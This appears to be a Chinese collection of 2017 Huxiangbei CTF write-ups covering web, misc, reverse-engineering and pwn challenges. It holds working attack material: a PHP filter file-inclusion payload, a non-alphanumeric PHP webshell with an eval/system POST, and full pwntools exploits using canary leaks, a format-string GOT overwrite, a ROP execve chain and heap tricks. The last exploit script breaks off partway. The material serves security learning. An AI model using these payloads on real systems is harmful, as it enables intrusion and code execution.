# 2017湖湘杯
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2017|中|

# 题目下载：
+ 暂无

# 网上公开WP：
+ https://xz.aliyun.com/t/1692
+ https://xz.aliyun.com/t/1703
+ https://xz.aliyun.com/t/1706
+ https://xz.aliyun.com/t/1755
+ https://www.freebuf.com/articles/others-articles/155172.html
+ http://www.cnblogs.com/L1B0/
+ https://blog.csdn.net/qq_35078631/article/details/78630704
+ https://www.freebuf.com/vuls/161116.html
+ https://www.jianshu.com/p/e162e98bd34c
+ https://www.freebuf.com/column/160343.html

# 本站备份WP：
**感谢作者：niexinming、LB919、Assassin__is__me、一叶飘零**
## WEB
### Web200文件上传
一开始真的以为是文件上传，后面发现是骗人的，简单的文件包含，扫描发现存在flag.php

![](https://ae01.alicdn.com/kf/HTB16iDYaKH2gK0jSZFE763qMpXa2.png)

payload:
> http://118.190.87.135:10080/?op=php://filter/convert.base64-encode/resource=flag

解密得到flag
```
<?php 
$flag="flag{c420fb4054e91944a71ff68f7079b9424e5cba21}"; 
?>
```
### random

看了一下存在源码泄露
```
<?php
error_reporting(0);
$flag = "*********************";
echo "please input a rand_num !";
function create_password($pw_length =  10){
    $randpwd = "";
    for ($i = 0; $i < $pw_length; $i++){
        $randpwd .= chr(mt_rand(100, 200));
    }
    return $randpwd;
}

session_start();

mt_srand(time());

$pwd=create_password();

echo $pwd.'||';    

if($pwd == $_GET['pwd']){
    echo "first";
    if($_SESSION['userLogin']==$_GET['login'])
        echo "Nice , you get the flag it is ".$flag ;
}else{
    echo "Wrong!";
}

$_SESSION['userLogin']=create_password(32).rand();

?>
```
然后就是随机数种子的问题了被，我们看到时间戳是随机数的种子，猜测服务器的时间是标准时间，在本地搭建一个php脚本跑出来，爆破的前42位，用另一个python脚本进行访问  
php脚本如下
```
<?php
session_start();
mt_srand(time());

for ($i = 0; $i < 42; $i++){
    echo mt_rand(100, 200);
    echo ",";
}
?>
```
然后我们python脚本如下
```
import requests,re
url_local = 'http://127.0.0.1/test.php'
url = 'http://114.215.138.89:10080/index.php?'
what = requests.get(url_local).content
what=what.split(',')
pwd =''
for i in range(10):
    pwd +="%"
    pwd +=str(hex(int(what[i])))[2:]
print pwd
tempurl =  url+"pwd="+ pwd.decode('gb2312')
print tempurl
html = requests.get(tempurl).content
print html
#hxb2017{6583be26c1403c25677c03ac7b3d1f22}
```
事实上我们绕过第一步就可以成功了，这里出题的问题，因为匹配userLogin的时候用的居然是弱类型，如果没有输入就是空了，和字符串正好匹配…救过果断直接绕过 

![](https://ae01.alicdn.com/kf/HTB1cc6YaUT1gK0jSZFh761AtVXaq.png)

>hxb2017{6583be26c1403c25677c03ac7b3d1f22}

### Web300
打开就能看到源码
```
<?php 
ini_set("display_errors", "On"); 
error_reporting(E_ALL | E_STRICT); 
if(!isset($_GET['content'])){ 
   show_source(__FILE__); 
   die(); 
} 
function rand_string( $length ) { 
   $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";     
   $size = strlen( $chars ); 
   $str = ''; 
   for( $i = 0; $i < $length; $i++) { 
       $str .= $chars[ rand( 0, $size - 1 ) ]; 
   } 
   return $str; 
} 
$data = $_GET['content']; 
$black_char = array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',' ', '!', '"', '#', '%', '&', '*', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\', '^', '`',  '|', '~');
foreach ($black_char as $b) { 
   if (stripos($data, $b) !== false){ 
       die("关键字WAF"); 
   } 
} 
$filename=rand_string(0x20).'.php'; 
$folder='uploads/'; 
$full_filename = $folder.$filename; 
if(file_put_contents($full_filename, '<?php '.$data)){ 
   echo "<a href='".$full_filename."'>shell</a></br>"; 
   echo "我的/flag,你读到了么"; 
}else{ 
   echo "噢 噢,错了"; 
} 
```
是要自己构造特殊的shellcode了，还没有把路封死，因为没有过滤如下

`= $ _ + ' ( ) [ ] { }等等`

就是时间问题，构造主要注意几点

+ 1.A可以用++进行计算，A++之后就是B
+ 2.字符++后变成了0
+ 3.''.[]之后报错返回的信息是Array可以构造POST了。加上[]{}.没有过滤即可构造

最终构造如下，提交时候需要将+替换成url

`$_=''.[];$__='%2b';$__=$_%2b%2b;$_=$_[$__];$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$___=$_;$_%2b%2b;$__=$_;$_%2b%2b;$_%2b%2b;$_%2b%2b;$____=$_;$_%2b%2b;${'_'.$__.$___.$____.$_}['_'](${'_'.$__.$___.$____.$_}['__']);`

访问得到flag

POST内容如下

`_=assert&__=eval($_POST['pass'])&pass=system('tac ../flag.php');`

`<?php $flag="=hxb2017{51f759f39ac1f0cd5509b299b1d908f7}"; ?>`

非常好的参考资料  
https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html  
http://www.freebuf.com/articles/web/9396.html  
学习了一波2333  

### Web400

最开始拿到题目：http://118.190.113.111:10080/index.php?act=user的时候挺没有头绪的

一开始以为是ssrf摸内网，又发现好像有上传，各种尝试302打进去探测端口，发现都挺奇怪的，一直没get到考点

后来发现有一个redirect.php，会重定向

于是在photo url处尝试了一下

http://118.190.113.111:10080/redirect.php?redirect=file:///etc/passwd

但是这里会被waf拦下，只允许通过.jpg和.png的结尾，于是尝试00截断

如下:

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/05ea04f6f4244fe2a87d6895717c4db2.png)

发现可以成功读取到内容

于是拿下源码进行分析（以下为本地测试，vps就打码了，毕竟是队友的）

在login.php里

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/c7858b3cd56345bea0c0937f34e1981f.jpeg)

如果是本地访问的话,token才会为1

在common.php中

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/29bdfae1cfc145ddbcb5ef61f0de8a2f.jpeg)

可以发现debug的值为1会返回http头数据

于是猜想利用redirect.php请问，伪造本地登录

http://118.190.113.111:10080/redirect.php?redirect=login.php?username=1&password=1.jpg

这样是不是就可以达到本地登录的目的了呢？

（注：这里有个小坑，需要2次url编码，所以payload如下）

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/cf9edcf231974f29906a3430ceee6e79.jpeg)

注意到源码中debug为1的时候会返回http头数据，跟进$result去处

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/3d0fd559f00947a184c556be788b2ad9.jpeg)

可见http头被写入了图片中，于是我们去访问刚才生成的图片

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/e78ec250048b42a4b6cc9a302e2cd0ac.jpeg)

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/4dca033e5b56423796f02eae3af7e446.png)

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/e0f704cb1d0d417e974e641035f3091c.jpeg)

可以看到我们需要的http头数据，里面就有我们需要的phpsession

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/db21cfb55d2d4f48bcfe504d156b9c4c.jpeg)

将自己的phpsessionid改成这个

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/16eb786699e242aea4ca63e92a13b0d7.jpeg)

可见我们已经用haozi登录成功了

看upload.php

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/27dbca25841e41f6b502187bb464b2b1.jpeg)

发现过滤并没有过滤.inc，并且token为1才可以上传

而我们注意到

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/bb382868325f49a8ba1882561a203949.jpeg)

这里的spl\_autoload\_register();

我们测试一下

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/c9a5f6f5f0ae431891d98d2ca03a3aad.png)

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/3edf5b3c26464e12a40d6a5c327be40d.png)

发现是可以解析.inc的

于是想到上次一个.inc文件

自己写了一个上传

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/e20e74a331904a79b07cfbec2d6f7741.jpeg)

再写了一个ls.inc

> <?php

> system('ls');

> ?>

于是上传

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/0af346af6ab143e49b83cb5161f371a1.jpeg)

发现上传成功

注：记得改一下Content-Type否则过不了waf

此时利用

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/0849e2bf31d04788876a60107866df9d.jpeg)

我们可以构造序列化

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/fac9f62835c544d984bda875d5ff4eca.png)

然后利用include参数包含路径

于是综合payload如下:

![](http://5b0988e595225.cdn.sohucs.com/images/20171229/68b140c8710b4a7ab63cc6bf704395bb.jpeg)

命令执行成功。

**总结一下:**

1.利用重定向+00截断读源码

2.利用重定向+debug获得本地登录的phpsessionid

3.上传.inc结尾的恶意文件

4.利用spl_autoload_register()的文件包含+cookie反序列化执行命令

## MISC
### 流量分析

解题思路:

Step1：直接打开，文件->导出对象->HTTP，可以看到flag.zip，保存下来。

![](https://ae01.alicdn.com/kf/HTB1lmbYaHj1gK0jSZFu763rHpXaA.png)

Step2：flag.zip里面有很多数字，目测是RGB，于是写脚本形成图片。

![](https://ae01.alicdn.com/kf/HTB1jL6SaGL7gK0jSZFB760ZZpXaM.png) 

![](https://ae01.alicdn.com/kf/HTB1wP_YaUY1gK0jSZFC763wqXXaB.png)

Step3：从上图可以猜想图片是宽为887，长为111。

脚本如下：得到flag。

```
#-*- coding:utf-8 -*-

from PIL import Image

import re

x = 887 #x坐标  通过对txt里的行数进行整数分解

y = 111 #y坐标  x*y = 行数

im = Image.new("RGB",(x,y))#创建图片

file = open('ce.txt') #打开rbg值文件

#通过一个个rgb点生成图片

for i in range(0,x):

    for j in range(0,y):

        line = file.readline()#获取一行

        rgb = line.split(",")#分离rgb

        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素

im.show()
```

### MISC200

解题思路：

压缩包里一个apk和一个疑似被加密的flag，先把apk拖到apktools里看下源码，

![](https://ae01.alicdn.com/kf/HTB1ICPVaSf2gK0jSZFP760sopXa5.png)

可以看到一个EncryptImageActivity，貌似有点用

可以看到很useful的函数

![](https://ae01.alicdn.com/kf/HTB1GujZaHY1gK0jSZTE760DQVXab.png)

继续往下看

![](https://ae01.alicdn.com/kf/HTB1Te6TaFT7gK0jSZFp761TkpXa1.png)

这就是对文件进行加密的具体函数了，可以看到，使用key对文件逐位异或得到cipherText，联系上面的关键函数，可以得知，这个程序的工作流程：

+ 1选择一个文件
+ 2输入密码
+ 3使用密码的md5值对原始文件进行逐位异或
+ 4将加密后的cipherText写入新文件并输出

由于异或的特性，使用password的md5值对已经加密的文件再次加密能够得到原来的文件，所以我们的任务就是逆向找到password了！！

上一句划掉

那么麻烦干嘛，扔到手机里运行一下（才不说我专心逆向找password，怕手机被加密另开了手机分身运行应用呢），发现密码已经是“记住”状态了，把flag.encrypted扔进去点击encrypt就会提示成功的创建了文件，只要提出来在Linux里直接能显示出图片了。

![](https://ae01.alicdn.com/kf/HTB1DwbSaGL7gK0jSZFB760ZZpXan.png)

Flag：出题人你出来，自己选砖头！神™字迹辨认

### Misc300

解题思路：

Step1：文件是pxl后缀，于是上网搜了一下。
```
>>> import pickle

>>> f = open('pixels.jpg.pkl')

>>> print(pickle.load(f))
```

用这个脚本打开文件，发现是一堆坐标，联想到是黑白图片的坐标，出现的位置为1，否则为0。

![](https://ae01.alicdn.com/kf/HTB1H9TVaUT1gK0jSZFh761AtVXaP.png)

Step2：将这堆数据处理成如图形式，执行第二张图片所示的代码，可以得到一张图片。

![](https://ae01.alicdn.com/kf/HTB1l.zVaND1gK0jSZFs762ldVXai.png)

![](https://ae01.alicdn.com/kf/HTB1ZKHYaKH2gK0jSZJn761T1FXaf.png)

将所得图片倒置反色得到如图

![](https://ae01.alicdn.com/kf/HTB12QfYaUY1gK0jSZFC763wqXXaC.png) 

可知是一个卡通人物，是熟悉的Bill Watterson创造的，于是得到flag{小写名字}。

## RE
### Re4newer

解题思路：

Step1：die打开，发现有upx壳。

![](https://ae01.alicdn.com/kf/HTB1fbrWaKL2gK0jSZFm7637iXXaF.png)

Step2：脱壳，执行upx -d 文件名即可。

![](https://ae01.alicdn.com/kf/HTB13e2VaUT1gK0jSZFh761AtVXaL.png)

Step3：IDA打开，shift+F12看字符串。

![](https://ae01.alicdn.com/kf/HTB1D_nWaKH2gK0jSZJn761T1FXaW.png)

点进去，F5看伪代码如图。

![](https://ae01.alicdn.com/kf/HTB1xpnYaRr0gK0jSZFn762RRXXal.png)

Step4：逆算法。点进sub_401080可以看到关键函数的算法。

![](https://ae01.alicdn.com/kf/HTB1DOrVaUz1gK0jSZLe7629kVXaF.png)

是简单的取字节异或，比较对象是v4-v14的值。

![](https://ae01.alicdn.com/kf/HTB1OwbWaRv0gK0jSZKb762K2FXaq.png)

可以看到，这里可以分成44个两位16进制的数，并且顺序与箭头所指的数的大小有关。

Step4：得到flag。

pyhon脚本如下：
```
a = [0x45,0x43,0x4E,0x44,

0x13,0x4A,0x76,0x59,

0x71,0x4B,0x7D,0x51,

0x54,0x7D,0x63,0x7D,

0x7D,0x5B,0x50,0x11,

0x52,0x4F,0x4B,0x51,

0x70,0x7D,0x47,0x4E,

0x67,0x67,0x70,0x70,

0x7D,0x57,0x7D,0x67,

0x71,0x51,0x63,0x52,

0x5F,0x56,0x13,0x7D]

flag = ''

for i in range(11):

for j in [3,2,1,0]: 

       flag += chr( a[i*4+j]^0x22)

print(flag)
```

## PWN
### pwn100
把pwns100直接拖入ida中：
main函数：

![](https://ae01.alicdn.com/kf/HTB1KC6UaNn1gK0jSZKPq6xvUXXaF.jpg)

base64解码函数

![](https://ae01.alicdn.com/kf/HTB1_bHVaNv1gK0jSZFFq6z0sXXaA.jpg)

输入函数

![](https://ae01.alicdn.com/kf/HTB1o0nUaND1gK0jSZFsq6zldVXag.jpg)

可以看到read可以输入的字符串可以长达0x200个，这里可造成缓冲区溢出漏洞
这个程序很简单，输入base64字符串输出base64解码之后的字符串
先运行一下程序看一下这个程序干了啥

![](https://ae01.alicdn.com/kf/HTB1jQbTaUY1gK0jSZFMq6yWcVXa1.jpg)

再看看程序开启了哪些保护:

![](https://ae01.alicdn.com/kf/HTB1sFzWaUY1gK0jSZFCq6AwqXXaT.jpg)

因为这个程序开了Canary，这个题目的要利用printf泄露这个程序中的Canary，然后再泄露libc的基地址，最后利用溢出重新布置栈空间getshell，因为每次fork,子进程复制父进程的数据空间(数据段)、栈和堆，父、子进程共享正文段。也就是说，对于程序中的数据，子进程要复制一份，但是对于指令，子进程并不复制而是和父进程共享,具体可参考https://www.cnblogs.com/bwangel23/p/4190043.html

这个文章，所以虽然在泄露Canary或者libc的时候使子进程崩溃了，但是不会影响父进程的稳定性

所以我的exp是
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import base64
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x08048B09'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

local_MAGIC = 0x0003AC69

io = process('/home/h11p/hackme/huxiangbei/pwns')

#io = remote('104.224.169.128', 18887)

#debug()

#getCanary
payload = 'a'*0x102
io.recvuntil('May be I can know if you give me some data[Y/N]\n')
io.sendline('Y')
io.recvuntil('Give me some datas:\n')
io.send(base64.b64encode(payload))
io.recvline()
myCanary=io.recv()[268:271]
Canary="\x00"+myCanary
print "Canary:"+hex(u32(Canary))

#getlibc
#debug()
payload = 'a'*0x151
io.recvuntil('May be I can know if you give me some data[Y/N]\n')
io.sendline('Y')
io.recvuntil('Give me some datas:\n')
io.send(base64.b64encode(payload))
io.recvline()
mylibc=io.recv()[347:351]
base_libc=u32(mylibc)-0x18637
print "mylibc_addr:"+hex(base_libc)


#pwn
#debug()
MAGIC_addr=local_MAGIC+base_libc
payload = 'a'*0x101+Canary+"a"*0xc+p32(MAGIC_addr)
io.recvuntil('May be I can know if you give me some data[Y/N]\n')
io.sendline('Y')
io.recvuntil('Give me some datas:\n')
io.send(base64.b64encode(payload))


io.interactive()
io.close()
```

我讲解一下如何获取Canary，因为输入的输入数据会被printf输出，遇到0x00的时候停止输出，如果输入的输入刚刚好覆盖到Canary前面就可以用printf输出Canary了，但是Canary后两位是0x00,所以得到输出之后要补足后两位的0x00

![](https://ae01.alicdn.com/kf/HTB1FJLWaHH1gK0jSZFwq6A7aXXaB.jpg)

同理也可以用这种方法计算出__libc_start_main和libc的基地址

![](https://ae01.alicdn.com/kf/HTB1k44kaebviK0jSZFNq6yApXXaA.jpg)

计算出Canary的值和基地址后，就可以通过溢出让程序程序跳转到MAGIC去了，就可以getshell了，至于MAGIC是啥，大家可以翻一下我以前写的文章：http://blog.csdn.net/niexinming/article/details/78512274

最后的效果是：

![](https://ae01.alicdn.com/kf/HTB1LfTUaUz1gK0jSZLeq6z9kVXai.jpg)

### pwn200
把pwns100直接拖入ida中：
main函数：

![](https://ae01.alicdn.com/kf/HTB1NJDWaHY1gK0jSZTEq6xDQVXaf.jpg)

sub_80485CD函数：

![](https://ae01.alicdn.com/kf/HTB173DUaHr1gK0jSZFDq6z9yVXa4.jpg)

在sub_80485CD函数可以看到输入的数据直接进入了printf函数中，所以这个肯定是一个格式化字符串漏洞
先运行一下程序看一下这个程序干了啥

![](https://ae01.alicdn.com/kf/HTB1U4nUaQL0gK0jSZFtq6xQCXXa3.jpg)

再看看程序开启了哪些保护:

![](https://ae01.alicdn.com/kf/HTB1CCjTaKT2gK0jSZFvq6xnFXXaA.jpg)

这个程序开了Canary和栈不可执行

这个题目的思路和http://blog.csdn.net/niexinming/article/details/78512274 差不多，唯一不同的是上一个题目提供了system函数，这个题目要从libc中找system函数，所以首先通过printf打印__libc_start_main函数这个地址，然后根据偏移计算libc的基地址，然后计算出system的实际地址，最后用fmtstr_payload(autofmt.offset, {atoi_got_addr: system_addr})把atio的地址覆盖为system的地址，就可以getshell了

我的exp是：

```
from pwn import *

def debug(addr = '0x0804867E'):
    raw_input('debug:')
    gdb.attach(r, "b *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

#localsystem = 0x0003ADA0

context(arch='i386', os='linux', log_level='debug')

r = process('/home/h11p/hackme/huxiangbei/pwne')

#r = remote('hackme.inndy.tw', 7711)

elf = ELF('/home/h11p/hackme/huxiangbei/pwne')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

def exec_fmt(payload):
    r.recvuntil('WANT PLAY[Y/N]\n')
    r.sendline('Y')
    r.recvuntil('GET YOUR NAME:\n')
    r.recvuntil('\n')
    r.sendline(payload)
    info = r.recv().splitlines()[1]
    print "info:"+info
    r.sendline('10')
    #r.close()
    return info
autofmt = FmtStr(exec_fmt)
r.close()

r = process('/home/h11p/hackme/huxiangbei/pwne')
atoi_got_addr = elf.got['atoi']
print "%x" % atoi_got_addr
system_offset_addr = libc.symbols['system']
print "%x" % system_offset_addr

payload1="%35$p"

#debug()

r.recvuntil('WANT PLAY[Y/N]\n')
r.sendline('Y')
r.recvuntil('GET YOUR NAME:\n')
r.recvuntil('\n')
r.sendline(payload1)
libc_start_main = r.recv().splitlines()[1]
libc_module=base_addr(libc_start_main,0x18637)
system_addr=libc_module+system_offset_addr
print "system_addr:"+hex(system_addr)
r.sendline('10')

payload2 = fmtstr_payload(autofmt.offset, {atoi_got_addr: system_addr})
r.recvuntil('WANT PLAY[Y/N]\n')
r.sendline('Y')
r.recvuntil('GET YOUR NAME:\n')
r.recvuntil('\n')
r.sendline(payload2)
r.recv()
#r.sendline('10')
r.sendline('/bin/sh')
r.interactive()
r.close()
```
效果是：

![](https://ae01.alicdn.com/kf/HTB1oJnUaUT1gK0jSZFrq6ANCXXa4.jpg)

### pwn300
把pwn300直接拖入ida中：
main函数：

![](https://ae01.alicdn.com/kf/HTB1wTvQaFY7gK0jSZKzq6yikpXaO.jpg)

add函数：

![](https://ae01.alicdn.com/kf/HTB15VDTaSf2gK0jSZFPq6xsopXaO.jpg)

这个题目很有意思，首先开辟一个3到255大小的堆空间，然后做加减乘除的计算之后把计算结果放入堆中，最后可以把所有的计算结果用memcpy函数全部放入函数的临时变量v5中也就是栈中，这样就会造成栈溢出
先运行一下程序看一下这个程序干了啥：

![](https://ae01.alicdn.com/kf/HTB1BsDVaHj1gK0jSZFuq6ArHpXan.jpg)

再看看程序开启了哪些保护:

![](https://ae01.alicdn.com/kf/HTB1Sg2TaND1gK0jSZFsq6zldVXar.jpg)

看到这个程序开了栈不可执行，于是肯定就会想到用rop来做
这个题目用ida打开之后发现有很多函数，所以判断这个题目是静态编译的

![](https://ae01.alicdn.com/kf/HTB1ZszTaUT1gK0jSZFhq6yAtVXaY.jpg)

所以可以用http://blog.csdn.net/niexinming/article/details/78259866 中我提到的ROPgadget工具来做，不出意外，很成功的找了完整的rop链

![](https://ae01.alicdn.com/kf/HTB1rcnWaHj1gK0jSZFOq6A7GpXah.jpg)

这个题目还有个难点就是不能直接输入十六进制，所以根据http://blog.csdn.net/niexinming/article/details/78666941 我的这篇文件可以用ctypes.c_int32(0x123).value进行转换
所以我的exp是：

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import binascii
import ctypes as ct
from struct import pack

context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x08048ff5'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

elf = ELF('/home/h11p/hackme/huxiangbei/pwn300')

io = process('/home/h11p/hackme/huxiangbei/pwn300')

p=[]

p.append( 0x0806ed0a)  # pop edx ; ret
p.append( 0x080ea060)  # @ .data
p.append( 0x080bb406)  # pop eax ; ret
p.append(eval('0x'+binascii.b2a_hex('nib/')))
p.append( 0x080a1dad)  # mov dword ptr [edx], eax ; ret
p.append( 0x0806ed0a)  # pop edx ; ret
p.append( 0x080ea064)  # @ .data + 4
p.append( 0x080bb406)  # pop eax ; ret
p.append(eval('0x'+binascii.b2a_hex('hs//')))
p.append(0x080a1dad)  # mov dword ptr [edx], eax ; ret
p.append(0x0806ed0a)  # pop edx ; ret
p.append(0x080ea068)  # @ .data + 8
p.append(0x08054730)  # xor eax, eax ; ret
p.append(0x080a1dad)  # mov dword ptr [edx], eax ; ret
p.append(0x080481c9)  # pop ebx ; ret
p.append(0x080ea060)  # @ .data
p.append(0x0806ed31)  # pop ecx ; pop ebx ; ret
p.append(0x080ea068)  # @ .data + 8
p.append(0x080ea060)  # padding without overwrite ebx
p.append(0x0806ed0a)  # pop edx ; ret
p.append(0x080ea068)  # @ .data + 8
p.append(0x08054730)  # xor eax, eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x0807b75f)  # inc eax ; ret
p.append(0x08049781)  # int 0x80

tempnum=0
#debug()
io.recvuntil('How many times do you want to calculate:')
io.sendline('255')
for i in xrange(0,16):
    io.recvuntil('5 Save the result\n')
    io.sendline('1')
    io.recvuntil('input the integer x:')
    io.sendline(str(tempnum))
    io.recvuntil('input the integer y:')
    io.sendline('0')

for j in p:
    io.recvuntil('5 Save the result\n')
    io.sendline('1')
    io.recvuntil('input the integer x:')
    io.sendline(str(ct.c_int32(j).value))
    io.recvuntil('input the integer y:')
    io.sendline('0')

io.recvuntil('5 Save the result\n')
io.sendline('5')
io.interactive()
io.close()
```

注意一点就是，就是程序在return 0之前会调用free，而为了保证free函数的正常运行，前十六次计算的结果必须为0，后面的计算结果就可以随意了

最后getshell的效果是：

![](https://ae01.alicdn.com/kf/HTB1ENHRaG67gK0jSZFHq6y9jVXas.jpg)

### pwn400
把pwn400直接拖入ida中：  
main函数：  

![](https://ae01.alicdn.com/kf/HTB15yrSaUz1gK0jSZLeq6z9kVXap.jpg)  

Create Profile函数：  

![](https://ae01.alicdn.com/kf/HTB1Ep6UaRr0gK0jSZFnq6zRRXXaB.jpg)  

Print Profile函数：  

![](https://ae01.alicdn.com/kf/HTB1iNrTaNv1gK0jSZFFq6z0sXXaT.jpg)  

Update Profile函数：  

![](https://ae01.alicdn.com/kf/HTB1x6vTaKP2gK0jSZFoq6yuIVXac.jpg)  

Exchange函数：  

![](https://ae01.alicdn.com/kf/HTB1bifUaND1gK0jSZFKq6AJrVXa0.jpg)

这个题目有点难度，我花了三天才搞定，题目的流程不难，首先创建Profile，当名字的长度小于8的时候会把数据写入bss段，数据的长度值nbytes会放入数据的后面，大于8的时候会malloc一个空间，把输入写入堆中，而指针会保存在bss段，而数据的长度值nbytes也会保存在指针的后面，更新Profile的时候也会做相同的操作，打印数据的时候会把名字输出，可以用这个功能泄露程序任意地址的任意数据，Exchange可以交换两个地址的数据，可以利用这个来getshell  
先运行一下程序看一下这个程序干了啥：  

![](https://ae01.alicdn.com/kf/HTB16yrQaG67gK0jSZFHq6y9jVXaL.jpg)  

再看看程序开启了哪些保护:  

![](https://ae01.alicdn.com/kf/HTB1ciHTaNv1gK0jSZFFq6z0sXXaB.jpg)  

看到这个程序开了栈不可执行，于是肯定就会想到用rop来做  

这个程序有两个地方可以利用：  
+ （1）是创建的Profile，名字长度如果小于8就把数据写入bss段中，但是你可以输入负数，如果是负数的话，就可以造成整数溢出，你就可以在bss段中写入任意长度的数据，就可以覆盖后面的长度值nbytes为任意数值，这样你可以伪造一个任意长度的数据，在print函数中可以看到如果nbytes长度小于8就去读bss中的数据，如果nbytes大于8就会去读bss中的指针指向的数据，如果我们伪造nbytes的话就可以让print Profile函数去读任意地址的数据，通过got表可以计算出libc的基地址  
+ （2）是Exchange函数可以交换任意两个指针，但是两个指针都是要有写权限的，程序中权限可以通过vmmap来查看  

![](https://ae01.alicdn.com/kf/HTB1py2UaHH1gK0jSZFwq6A7aXXas.jpg)  

这个地方是难点，解决方法是：用top_chunk 指针和read@got指针进行交换，第二次堆分  
配时候可以分配到我想要的位置，就可以把想要数据写入read@got中，当下回调用read的时候就可以跳到MAGIC中getshell了，关于top_chunk的介绍可以参考[https://www.cnblogs.com/alisecurity/p/5486458.html](https://www.cnblogs.com/alisecurity/p/5486458.html)

我的exp

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import binascii
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

localMAGIC=0x5fbc6
localmain_arena=0x001B2780

def debug(addr = '0x08048BA6'):
	raw_input('debug:')
	gdb.attach(io, "b *" + addr)

def base_addr(prog_addr,sysmbol,offset):
	if sysmbol=='min':
		return eval(prog_addr)-offset
	else:
		return eval(prog_addr) + offset

def cr_up_profile(choose,name_len,name,age):
	io.recvuntil('>')
	io.send(choose)
	io.recv()
	io.sendline(name_len)
	io.recvuntil('Input your name:\n')
	io.sendline(name)
	io.recvuntil('Input your age:\n')
	io.sendline(age)

def print_profile(address):
	io.recvuntil(">")
	io.sendline('2')
	data = io.recv().splitlines()[0][11:15][::-1]
	log.info("%#x => %s" % (address, (data or '').encode('hex')))
	return data

def change_age(address1,address2):
	io.sendline('4')
	io.recvuntil('Person 1:')
	io.send(p32(address1))
	io.recvuntil('Person 2:')
	io.send(p32(address2))

def leak(address):
	payload = p32(address) + 'a' * 4 + p32(10)
	cr_up_profile('3','-10',payload,'10')
	return print_profile(address)


def getshell(address1,address2,address3):
	change_age(address1,address2)
	cr_up_profile('3','20',address3,'20')


#libc addr
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
symbols = ['environ', '_environ', '__environ']
for symbol in symbols:
	environ = libc.symbols[symbol]
print "environ:"+hex(environ)
head=libc.symbols['__curbrk']
print "head:"+hex(head)
system=libc.symbols['system']
print "system:"+hex(system)
__malloc_hook=libc.got['__malloc_hook']
print "__malloc_hook:"+hex(__malloc_hook)

#profile addr
elf = ELF('/home/h11p/hackme/huxiangbei/profile')
printf_addr=elf.got['printf']
puts_addr=elf.got['puts']
atoi_addr=elf.got['atoi']
malloc_addr=elf.got['malloc']
__isoc99_scanf_addr=elf.got['__isoc99_scanf']
read_addr=elf.got['read']
print "printf_addr:"+hex(printf_addr)
print "puts_addr:"+hex(puts_addr)
print "atoi_addr:"+hex(atoi_addr)
print "malloc_addr:"+hex(malloc_addr)
print "__isoc99_scanf_addr:"+hex(__isoc99_scanf_addr)
print "read_addr:"+hex(read_addr)

io = process('/home/h11p/hackme/huxiangbei/profile')

#debug()

#create profile
cr_up_profile('1','10','a'*8,'1'*12)

#leak libc base
libc_base=base_addr("0x"+binascii.b2a_hex(leak(printf_addr)),'min',0x49670) #0x49670

#get libc func addr
print "libc_base:"+hex(libc_base)
MAGIC_addr=libc_base+localMAGIC
print "MAGIC_addr:"+hex(MAGIC_addr)
environ_addr=libc_base+environ
print "environ_addr:"+hex(environ_addr)
head_addr=libc_base+head
print "head_addr:"+hex(head_addr)
